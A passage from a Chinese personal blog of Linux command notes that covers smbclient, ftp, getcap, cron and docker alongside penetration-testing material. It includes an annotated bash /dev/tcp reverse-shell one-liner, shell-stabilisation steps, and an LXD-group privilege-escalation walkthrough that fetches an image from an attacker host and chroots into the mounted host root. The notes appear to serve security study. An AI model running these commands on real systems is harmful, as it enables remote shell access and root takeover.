+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DIFF"><figure class="iseeu highlight /diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-W：指定工作组名。</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-I：指定目标服务器的 IP 地址。</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-c：直接执行命令，不进入交互模式。</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-p：指定端口号，默认是 445。</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-N：跳过用户名密码提示，使用匿名方式。</span></span><br></pre></td></tr></table></figure></div>
+<p>常用操作<br>下载文件：使用 get 命令下载文件。<br>上传文件：使用 put 命令上传文件。</p>
+<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>FTP（File Transfer Protocol，文件传输协议）是一种用于在网络上传输文件的标准协议。它使用客户端 - 服务器模型，客户端通过 FTP 连接到服务器，上传或下载文件。FTP 默认使用端口 <code>21</code>。<br>ftp username@ip 登录ftp  如果要匿名登录 用户名就用anonymous</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ftp</span> anonymous@<span class="keyword">ftp</span>.example.com</span><br></pre></td></tr></table></figure></div>
+<h3 id="常用交互命令（登录后使用）"><a href="#常用交互命令（登录后使用）" class="headerlink" title="常用交互命令（登录后使用）"></a>常用交互命令（登录后使用）</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>user</code></td>
+<td>重新输入用户名</td>
+<td><code>user anonymous</code></td>
+</tr>
+<tr>
+<td><code>pass</code></td>
+<td>输入密码（匿名登录可留空）</td>
+<td><code>pass</code></td>
+</tr>
+<tr>
+<td><code>binary</code></td>
+<td>设置为二进制传输模式</td>
+<td><code>binary</code></td>
+</tr>
+<tr>
+<td><code>ascii</code></td>
+<td>设置为文本传输模式</td>
+<td><code>ascii</code></td>
+</tr>
+<tr>
+<td><code>get</code></td>
+<td>下载单个文件</td>
+<td><code>get file.txt</code></td>
+</tr>
+<tr>
+<td><code>mget</code></td>
+<td>下载多个文件（支持通配符）</td>
+<td><code>mget *.log</code></td>
+</tr>
+<tr>
+<td><code>put</code></td>
+<td>上传单个文件</td>
+<td><code>put backup.zip</code></td>
+</tr>
+<tr>
+<td><code>mput</code></td>
+<td>上传多个文件（支持通配符）</td>
+<td><code>mput *.jpg</code></td>
+</tr>
+<tr>
+<td><code>passive</code></td>
+<td>切换被动模式状态</td>
+<td><code>passive</code></td>
+</tr>
+<tr>
+<td><code>ls</code></td>
+<td>列出远程目录文件</td>
+<td><code>ls /pub</code></td>
+</tr>
+<tr>
+<td><code>cd</code></td>
+<td>切换远程目录</td>
+<td><code>cd /downloads</code></td>
+</tr>
+<tr>
+<td><code>lcd</code></td>
+<td>切换本地目录</td>
+<td><code>lcd ~/Documents</code></td>
+</tr>
+<tr>
+<td><code>quit</code>&#x2F;<code>bye</code></td>
+<td>退出 FTP 会话</td>
+<td><code>quit</code></td>
+</tr>
+</tbody></table>
+<h2 id="getcap"><a href="#getcap" class="headerlink" title="getcap"></a>getcap</h2><p><code>getcap</code> 用于列出和显示指定文件的能力。能力是通过文件系统附加在可执行文件上的特定权限，能够控制该程序在运行时执行某些特权操作（如网络访问、文件访问等），而不需要完全的 root 权限。<br><strong><code>getcap &lt;file&gt;</code></strong>    显示指定文件的能力信息<br><strong><code>getcap -r &lt;directory&gt;</code></strong>    递归地列出指定目录及其子目录下所有文件的能力信息。<br><strong><code>getcap -v &lt;file&gt;</code></strong>    显示文件的详细能力信息</p>
+<h3 id="能力（Capabilities）示例"><a href="#能力（Capabilities）示例" class="headerlink" title="能力（Capabilities）示例"></a><strong>能力（Capabilities）示例</strong></h3><ul>
+<li><strong><code>cap_net_raw</code></strong><br>  允许程序使用原始网络套接字（例如执行 <code>ping</code> 命令）。</li>
+<li><strong><code>cap_dac_read_search</code></strong><br>  允许程序绕过文件的读和搜索权限检查。</li>
+<li><strong><code>cap_sys_admin</code></strong><br>  允许程序执行许多系统管理操作，相当于 root 权限。</li>
+<li><strong><code>cap_chown</code></strong><br>  允许程序更改文件的所有者和组。</li>
+<li><strong><code>cap_setuid</code></strong><br>  允许程序更改自己的用户 ID。<br>使用时用&#x2F;usr&#x2F;sbin&#x2F;getcap 这个目录下的权限更高  能找到更多文件</li>
+</ul>
+<h2 id="ln"><a href="#ln" class="headerlink" title="ln"></a>ln</h2><p>ln 是 Linux 系统中的 创建链接命令，用于创建 硬链接 或 符号链接（软链接）。</p>
+<h3 id="常用参数-6"><a href="#常用参数-6" class="headerlink" title="常用参数"></a>常用参数</h3><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-s</code></td>
+<td>创建符号链接（软链接）</td>
+</tr>
+<tr>
+<td><code>-f</code></td>
+<td>强制覆盖已存在的链接</td>
+</tr>
+<tr>
+<td><code>-v</code></td>
+<td>显示详细信息</td>
+</tr>
+<tr>
+<td><code>-n</code></td>
+<td>取消对目标的符号链接解析</td>
+</tr>
+</tbody></table>
+<h2 id="bash-i-dev-tcp-ip-1234-0-1"><a href="#bash-i-dev-tcp-ip-1234-0-1" class="headerlink" title="bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;1234 0&gt;&amp;1"></a>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;1234 0&gt;&amp;1</h2><p> 反弹shell指令</p>
+<h3 id="bash-i"><a href="#bash-i" class="headerlink" title="bash -i"></a>bash -i</h3><p>bash 是 Unix 系统上的一个常用 shell（命令行解释器）。bash 可以启动交互式或非交互式 shell。<br>-i 选项使 bash 启动为交互式 shell，这意味着 shell 会尝试从标准输入读取命令并打印标准输出。交互式 shell 还会加载用户的配置文件（例如 .bashrc），使其行为与普通终端相似。</p>
+<h3 id="dev-tcp-192-168-240-83-1234"><a href="#dev-tcp-192-168-240-83-1234" class="headerlink" title="&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.240.83&#x2F;1234"></a>&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.240.83&#x2F;1234</h3><blockquote>
+<p>&amp; 是 Bash 中用于重定向输出的语法，它将文件描述符从一个地方重定向到另一个地方。<br>&#x2F;dev&#x2F;tcp&#x2F;192.168.240.83&#x2F;1234 是一个特殊的文件路径，它是 Bash 内置的一种方式，通过 TCP 连接发送和接收数据。它表示一个 TCP 连接，其中 192.168.240.83 是目标 IP 地址，1234 是目标端口号。<br>这种方式允许 Bash 将输出流重定向到一个 TCP 连接，而不是普通的文件或终端。这使得 Bash 可以将输出（如命令的执行结果）发送到远程主机。<br>所以，&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.240.83&#x2F;1234 将 bash 的标准输出（STDOUT）和标准错误（STDERR）都重定向到目标机器的 IP 地址 192.168.240.83，并通过端口 1234 发送。</p>
+</blockquote>
+<h3 id="0-1"><a href="#0-1" class="headerlink" title="0&gt;&amp;1"></a>0&gt;&amp;1</h3><p>0 代表标准输入（stdin）。</p>
+<blockquote>
+<p>&amp;1 将标准输入重定向到标准输出。这意味着输入流会从 TCP 连接而不是终端接收。<br>通过这一部分，bash 的标准输入（命令输入）会从远程机器的 TCP 连接接收，而不是从用户的终端接收。<br>综合解释<br>整个命令的作用是：<br>启动一个交互式 Bash shell (bash -i)。<br>将标准输出和标准错误输出重定向到一个 TCP 连接，目标 IP 为 192.168.240.83，目标端口为 1234。<br>将标准输入重定向到 TCP 连接，从远程机器接收输入。<br>反向 Shell<br>这行命令的作用就是创建一个反向 shell。受害主机通过 bash 连接到攻击者的机器，并通过一个指定的端口（这里是 1234）与攻击者进行交互：</p>
+</blockquote>
+<h2 id="stty-raw-echo-fg-美化终端"><a href="#stty-raw-echo-fg-美化终端" class="headerlink" title="stty raw -echo; fg (美化终端)"></a>stty raw -echo; fg (美化终端)</h2><p><code>stty raw -echo; fg</code> 是一个组合命令，通常用于恢复终端的正常行为或从后台恢复一个挂起的任务。<br>刚才用了<code>script -qc /bin/bash /dev/null</code>然后ctrl+z挂起了那个回话<br>再输入reset xterm升级终端<br>然后再输入当前kali的stty的行数列数  先用stty -a获取行数列数<br>然后在web shell中输入 stty rows 34 columns 115<br>完整美化终端操作：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">script -qc /bin/bash /dev/null</span><br><span class="line">ctrl + z挂起</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">reset</span><br><span class="line">xterm</span><br><span class="line">本机<span class="built_in">stty</span> -a 查看自己的  rows columns</span><br><span class="line"><span class="built_in">stty</span>  rows 35 columns 115</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="–"><a href="#–" class="headerlink" title="–"></a>–</h2><p>当创建&#x2F;使用的文件名中有–时，要在命令中加上– 告诉命令后面的不是参数，因为默认–后面跟着参数</p>
+<h2 id="pts"><a href="#pts" class="headerlink" title="pts"></a>pts</h2><p>PTS（Pseudo Terminal Slave，伪终端从设备）是一种 伪终端（Pseudo Terminal, PTY） 设备，它用于支持终端仿真，如 SSH 连接、screen、tmux、script、expect 等工具。它通常与 PTY 主设备（Master） 配对，用于提供交互式终端访问。<br>在 Linux 或 macOS 中，当你打开一个新的终端会话（如 ssh 远程连接、tmux 分屏、或 screen 会话），系统会为你分配一个 伪终端设备，通常格式为：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/dev/</span>pts/N</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><p>名称查看配置文件：<code>docker inspect </code><br>列出所有容器: <code>docker ps -a</code><br>进入容器的交互式shell : <code>docker exec -it &lt;container_id_or_name&gt; /bin/bash</code><br>查看所有卷: <code>docker volume ls</code><br>删除卷：<code>docker volume rm &lt;volume_name&gt;</code></p>
+<h2 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h2><p><code>wc</code>（<strong>word count</strong>）是一个用于统计文件内容的命令，能够计算 <strong>行数、单词数、字符数和字节数</strong>。</p>
+<h3 id="常用参数-7"><a href="#常用参数-7" class="headerlink" title="常用参数"></a><strong>常用参数</strong></h3><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-l</code></td>
+<td><strong>只统计行数</strong>（Lines）</td>
+</tr>
+<tr>
+<td><code>-w</code></td>
+<td><strong>只统计单词数</strong>（Words）</td>
+</tr>
+<tr>
+<td><code>-c</code></td>
+<td><strong>只统计字节数</strong>（Bytes）</td>
+</tr>
+<tr>
+<td><code>-m</code></td>
+<td><strong>只统计字符数</strong>（Characters），与 <code>-c</code> 类似，但 <code>-m</code> 适用于多字节字符（如 UTF-8）</td>
+</tr>
+<tr>
+<td><code>-L</code></td>
+<td><strong>输出最长行的字符数</strong></td>
+</tr>
+</tbody></table>
+<h2 id="sulogin"><a href="#sulogin" class="headerlink" title="sulogin"></a>sulogin</h2><p><code>sulogin</code> 是 <strong>Single User Login（单用户模式登录）</strong> 的命令，通常用于 <strong>Linux&#x2F;Unix 在单用户模式（维护模式）下，以 root 身份登录</strong>，用于修复系统或执行维护任务。<br>基本用法</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sulogin <span class="selector-attr">[OPTIONS]</span> <span class="selector-attr">[TTY]</span></span><br></pre></td></tr></table></figure></div>
+
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-p</td>
+<td>单用户 Shell 调用一个破折号作为参数中的第一个字符</td>
+</tr>
+<tr>
+<td>-t</td>
+<td>程序只会等待用户输入指定秒数</td>
+</tr>
+<tr>
+<td>ENVIRONMENT VARIABLES</td>
+<td></td>
+</tr>
+<tr>
+<td>sulogin looks for the environment variable SUSHELL or sushell to determine what shell to start. If the environment variable is not set, it will try to execute root’s shell from &#x2F;etc&#x2F;passwd. If that fails, it will fall</td>
+<td></td>
+</tr>
+<tr>
+<td>back to &#x2F;bin&#x2F;sh.</td>
+<td></td>
+</tr>
+<tr>
+<td>说明SUSHELL这个环境变量可以指定启动什么shell</td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="cron定时任务"><a href="#cron定时任务" class="headerlink" title="cron定时任务"></a>cron定时任务</h2><p><code>cron</code> 是 <strong>Linux&#x2F;Unix</strong> 系统中的定时任务调度工具，可用于 <strong>定期执行脚本、命令或程序</strong>，适用于 <strong>自动备份、日志清理、定时任务等场景</strong>。<br>相关路径</p>
+<table>
+<thead>
+<tr>
+<th><strong>文件 &#x2F; 目录</strong></th>
+<th><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/etc/crontab</code></td>
+<td><strong>系统级</strong> crontab 配置，所有用户共享</td>
+</tr>
+<tr>
+<td><code>/var/spool/cron/crontabs/</code></td>
+<td><strong>存放用户的 crontab</strong> 任务文件（不能手动编辑）</td>
+</tr>
+<tr>
+<td><code>/etc/cron.d/</code></td>
+<td><strong>存放系统定时任务</strong>，格式与 <code>/etc/crontab</code> 相同</td>
+</tr>
+<tr>
+<td><code>/etc/cron.hourly/</code></td>
+<td><strong>每小时</strong> 执行的脚本目录</td>
+</tr>
+<tr>
+<td><code>/etc/cron.daily/</code></td>
+<td><strong>每天</strong> 执行的脚本目录</td>
+</tr>
+<tr>
+<td><code>/etc/cron.weekly/</code></td>
+<td><strong>每周</strong> 执行的脚本目录</td>
+</tr>
+<tr>
+<td><code>/etc/cron.monthly/</code></td>
+<td><strong>每月</strong> 执行的脚本目录</td>
+</tr>
+<tr>
+<td><code>/var/log/syslog</code> 或 <code>/var/log/cron</code></td>
+<td><strong>存放 <code>cron</code> 执行日志</strong>（不同系统路径可能不同）</td>
+</tr>
+</tbody></table>
+<h2 id="lxd"><a href="#lxd" class="headerlink" title="lxd"></a>lxd</h2><p>LXD 是一个 root 进程，它负责执行任意用户的 LXD UNIX 套接字写入访问操作。而且在某些情况下，LXD 甚至都不会调用它的用户权限进行检查和匹配</p>
+<p>Linux Container（LXC）通常被认为是一种轻量级虚拟化技术，它介于 Chroot 和完整开发的虚拟机之间，LXC 可以创建一个跟正常 Linux 操作系统十分接近的环境，但是不需要使用到单独的内核资源。</p>
+<p>Linux Daemon（LXD）是一个轻量级容器管理程序，而 LXD 是基于 LXC 容器技术实现的，而这种技术之前 Docker 也使用过。LXD 使用了稳定的 LXC API 来完成所有的后台容器管理工作，并且增加了 REST API 支持，更进一步地提升了用户体验度。<br>如果一个普通用户属于 <code>lxd</code> 组，那么他就可以：</p>
+<ul>
+<li>创建 LXD 容器</li>
+<li>以 <code>security.privileged=true</code> 的方式运行容器（即让容器以 root 权限运行）</li>
+<li>挂载宿主机的目录到容器中，理论上可以访问整个文件系统</li>
+</ul>
+<p>由于 <code>lxd</code> 进程是以 root 权限运行的，而 <code>lxd</code> 组用户可以控制 <code>lxd</code>，所以它本质上是一个 <strong>“权限升级的入口”</strong>。<br><strong>（2）提权流程</strong></p>
+<p><strong>核心思想</strong>：</p>
+<ol>
+<li><strong>利用 LXD 组权限</strong> 创建一个 <strong>特权（privileged）容器</strong>，该容器将以 root 运行。</li>
+<li><strong>挂载宿主机的根目录</strong> 到容器的 <code>/mnt/root</code> 目录，使得容器内部可以直接访问宿主机的文件系统。</li>
+<li>进入容器后，利用 <code>chroot</code> 进入 <code>/mnt/root</code>，从而获得宿主机的 root 权限。<br>提权详细过程</li>
+</ol>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#（1）获取 Alpine Linux 镜像</span></span><br><span class="line">wget http://攻击机IP/alpine-v3.13-x86_64-20210218_0139.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#lxd初始化</span></span><br><span class="line">lxd init   <span class="comment">#一路回车</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#然后导入镜像：</span></span><br><span class="line">lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --<span class="built_in">alias</span> image_name</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建特权容器</span></span><br><span class="line">lxc init image_name ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#挂载宿主机的根目录</span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#启动并进入容器</span></span><br><span class="line">lxc start ignite </span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#切换到宿主机环境</span></span><br><span class="line"><span class="built_in">chroot</span> /mnt/root</span><br></pre></td></tr></table></figure></div>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/49809.html" title="linux指令笔记">https://guayu-kakeru.github.io/posts/49809.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/linux/" rel="tag"># linux</a>
+              <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" rel="tag"># 操作系统</a>
+              <a href="/tags/shell/" rel="tag"># shell</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/11168.html" rel="prev" title="linux基础指令笔记">
+      <i class="fa fa-chevron-left"></i> linux基础指令笔记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/15173.html" rel="next" title="kali工具笔记">
+      kali工具笔记 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4%E7%AC%94%E8%AE%B0"><span class="nav-text">Linux 常用指令笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#awk-%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E5%B7%A5%E5%85%B7"><span class="nav-text">&#x3D;&#x3D;awk&#x3D;&#x3D; 文本处理工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E5%8F%98%E9%87%8F"><span class="nav-text">核心变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-text">示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#knockd-%E6%9C%8D%E5%8A%A1"><span class="nav-text">knockd 服务</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%9A-etc-knockd-conf"><span class="nav-text">配置文件：&#x2F;etc&#x2F;knockd.conf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%9F%E8%83%BD%EF%BC%9A"><span class="nav-text">功能：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="nav-text">应用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#grep-%E6%96%87%E6%9C%AC%E6%90%9C%E7%B4%A2%E5%B7%A5%E5%85%B7"><span class="nav-text">grep 文本搜索工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%83%E5%AD%97%E7%AC%A6%E8%A1%A8"><span class="nav-text">元字符表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-1"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nc-Netcat-%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7"><span class="nav-text">nc (Netcat) 网络工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-2"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-1"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sudo-%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86"><span class="nav-text">sudo 权限管理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B8%E5%9E%8B%E9%85%8D%E7%BD%AE"><span class="nav-text">典型配置</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#drush-Drupal-Shell"><span class="nav-text">drush (Drupal Shell)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#scp-%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="nav-text">scp 安全文件传输</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-2"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ps"><span class="nav-text">ps</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-3"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#apache2"><span class="nav-text">apache2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tac"><span class="nav-text">tac</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#var-mail"><span class="nav-text">&#x2F;var&#x2F;mail</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#etc-release"><span class="nav-text">&#x2F;etc&#x2F;release</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tar"><span class="nav-text">tar</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-4"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-3"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#find"><span class="nav-text">find</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E5%92%8C%E7%A4%BA%E4%BE%8B"><span class="nav-text">常用参数和示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%93break-system-packages"><span class="nav-text">–break-system-packages</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exiftool"><span class="nav-text">exiftool</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-5"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#curl"><span class="nav-text">curl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tldr"><span class="nav-text">tldr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gocr"><span class="nav-text">gocr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#doas"><span class="nav-text">doas</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-4"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dig"><span class="nav-text">dig</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-5"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#resolv-conf"><span class="nav-text">resolv.conf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#etc-bind"><span class="nav-text">&#x2F;etc&#x2F;bind</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tr"><span class="nav-text">tr</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-6"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sed"><span class="nav-text">sed</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-7"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#alias"><span class="nav-text">alias</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#openssl"><span class="nav-text">openssl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xargs"><span class="nav-text">xargs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#id-rsa"><span class="nav-text">id_rsa</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssh-authorized-keys"><span class="nav-text">~&#x2F;.ssh&#x2F;authorized_keys</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%9C%E7%94%A8"><span class="nav-text">作用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E7%A7%81%E9%92%A5%E7%94%9F%E6%88%90%E5%85%AC%E9%92%A5"><span class="nav-text">用私钥生成公钥</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smb"><span 